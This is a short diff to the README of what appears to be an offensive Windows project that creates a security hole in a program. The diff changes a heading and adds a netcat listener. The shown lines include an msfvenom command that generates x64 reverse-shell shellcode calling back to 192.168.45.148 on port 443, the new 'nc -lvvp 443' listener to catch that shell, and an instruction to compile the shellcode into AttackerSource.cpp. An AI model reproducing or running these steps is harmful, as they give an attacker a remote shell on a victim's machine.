@@ -10,10 +10,11 @@ This code demonstrates how to create a security hole in your program, potentiall
 
 ## Running the Code
 
-### Generate Shellcode for AttackerPE.exe
+### Generate Shellcode for AttackerPE.exe and run listener
 
 ```sh
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.148 LPORT=443 -f c -b \x00\x0a\x0d
+nc -lvvp 443
 ```
 
 Copy the generated shellcode into `AttackerSource.cpp` and compile it.
